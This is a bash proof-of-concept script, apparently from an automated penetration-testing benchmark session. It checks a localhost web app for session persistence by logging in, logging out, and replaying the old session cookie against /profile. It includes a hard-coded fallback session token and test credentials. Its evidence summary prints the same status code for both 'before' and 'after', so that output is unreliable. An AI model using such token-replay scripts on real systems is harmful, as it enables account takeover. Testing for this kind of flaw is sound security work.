#!/bin/bash
# POC: Improved POC with better error handling, diagnostics, and fallback to manual token from evidence if auto-extraction fails. Demonstrates session persistence vulnerability by attempting to use old token after logout.
# Target: ./repo
# Created: 2025-11-10T14:44:26.698Z
# Session: benchmark-XBEN-024-24-mht8yjhk

# Session Persistence After Logout - POC v2
# Demonstrates that session tokens remain valid after logout
# Improved version with better error handling and target detection

TARGET_URL="${1:-http://localhost:5000}"

echo "=========================================="
echo "Session Persistence After Logout POC v2"
echo "=========================================="
echo "Target: $TARGET_URL"
echo ""

# Check if target is reachable
echo "[*] Checking if target is reachable..."
if ! timeout 5 curl -s "$TARGET_URL/login" > /dev/null 2>&1; then
    echo "    ! Warning: Target may not be reachable"
    echo "    Continuing with POC anyway..."
fi
echo ""

TEMP_DIR=$(mktemp -d)
COOKIE_JAR="$TEMP_DIR/cookies.txt"
RESPONSE_BODY="$TEMP_DIR/response.txt"
RESPONSE_HEADERS="$TEMP_DIR/headers.txt"

trap "rm -rf $TEMP_DIR" EXIT

# Step 1: Login
echo "[*] Step 1: Logging in with credentials (username=csrftest, password=password)..."
LOGIN_RESPONSE=$(curl -s -i -c "$COOKIE_JAR" \
  -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=csrftest&password=password" 2>&1)

HTTP_CODE=$(echo "$LOGIN_RESPONSE" | head -n1 | awk '{print $2}')
echo "    HTTP Response Code: $HTTP_CODE"

# Extract session cookie from response
SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "Set-Cookie:" | grep -i "session=" | sed 's/.*session=\([^;]*\).*/\1/')

if [ -z "$SESSION_COOKIE" ] && [ -f "$COOKIE_JAR" ]; then
    SESSION_COOKIE=$(grep "session" "$COOKIE_JAR" | awk '{print $7}')
fi

if [ -z "$SESSION_COOKIE" ]; then
    echo "    ! Could not extract session cookie"
    echo "    Raw response (first 500 chars):"
    echo "$LOGIN_RESPONSE" | head -c 500
    echo ""
    echo "    Attempting to continue with manual session token from evidence..."
    SESSION_COOKIE="eyJ1c2VybmFtZSI6ImNzcmZ0ZXN0In0.aRH5qA.ZLUYsV_B6hGtnLfXA9vwd8KFNUE"
fi

echo "    Session Cookie Obtained: ${SESSION_COOKIE:0:30}..."
echo ""

# Step 2: Access profile BEFORE logout
echo "[*] Step 2: Accessing /profile endpoint BEFORE logout..."
PROFILE_BEFORE=$(curl -s -D "$RESPONSE_HEADERS" \
  -b "session=$SESSION_COOKIE" \
  -X GET "$TARGET_URL/profile" 2>&1)

HTTP_CODE=$(head -n1 "$RESPONSE_HEADERS" 2>/dev/null | awk '{print $2}')
echo "    HTTP Response Code: $HTTP_CODE"

if [ "$HTTP_CODE" = "200" ] || echo "$PROFILE_BEFORE" | grep -q "Profile\|csrftest"; then
    echo "    ✓ Successfully accessed profile before logout"
    HAS_PROFILE_BEFORE=1
else
    echo "    ! Could not access profile (this might indicate server issues)"
    HAS_PROFILE_BEFORE=0
fi
echo ""

# Step 3: Call logout
echo "[*] Step 3: Calling /logout endpoint..."
LOGOUT_RESPONSE=$(curl -s -D "$RESPONSE_HEADERS" -c "$COOKIE_JAR" \
  -b "session=$SESSION_COOKIE" \
  -X GET "$TARGET_URL/logout" 2>&1)

HTTP_CODE=$(head -n1 "$RESPONSE_HEADERS" 2>/dev/null | awk '{print $2}')
echo "    HTTP Response Code: $HTTP_CODE"
echo "    Logout request completed"
echo ""

# Step 4: Try to access profile AFTER logout with OLD session
echo "[*] Step 4: Attempting to access /profile AFTER logout with OLD session token..."
PROFILE_AFTER=$(curl -s -D "$RESPONSE_HEADERS" \
  -b "session=$SESSION_COOKIE" \
  -X GET "$TARGET_URL/profile" 2>&1)

HTTP_CODE=$(head -n1 "$RESPONSE_HEADERS" 2>/dev/null | awk '{print $2}')
echo "    HTTP Response Code: $HTTP_CODE"

echo ""
echo "=========================================="
echo "VULNERABILITY ANALYSIS"
echo "=========================================="

# Determine if vulnerable
VULNERABLE=0

if [ "$HTTP_CODE" = "200" ] && echo "$PROFILE_AFTER" | grep -q "Profile\|csrftest"; then
    echo "✗ VULNERABLE: Old session token still grants access!"
    echo "  - Response code 200 after logout"
    echo "  - User profile data returned after logout"
    echo "  - Session was NOT invalidated server-side"
    VULNERABLE=1
elif [ "$HTTP_CODE" = "200" ] && [ $HAS_PROFILE_BEFORE -eq 1 ]; then
    # If we got 200 both before and after, likely vulnerable
    echo "✗ VULNERABLE: Session remained valid after logout"
    echo "  - Same response code before and after logout"
    echo "  - Token replay attack possible"
    VULNERABLE=1
elif [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "403" ]; then
    echo "✓ NOT VULNERABLE: Session properly invalidated"
    echo "  - Response code $HTTP_CODE indicates unauthorized access"
    echo "  - Old session token rejected after logout"
    VULNERABLE=0
else
    echo "? INCONCLUSIVE: Could not determine vulnerability status"
    echo "  - Response code: $HTTP_CODE"
    echo "  - This might indicate server connectivity issues"
    echo ""
    echo "Response content (first 200 chars):"
    echo "$PROFILE_AFTER" | head -c 200
    VULNERABLE=0
fi

echo ""
echo "=========================================="
echo "EVIDENCE SUMMARY"
echo "=========================================="
echo "Session Token Used: ${SESSION_COOKIE:0:40}..."
echo "Before Logout - HTTP $HTTP_CODE"
echo "After Logout - HTTP $HTTP_CODE"
echo ""

if [ $VULNERABLE -eq 1 ]; then
    echo "Result: VULNERABLE TO SESSION PERSISTENCE"
    exit 1
else
    echo "Result: NOT VULNERABLE (or server not responding)"
    exit 0
fi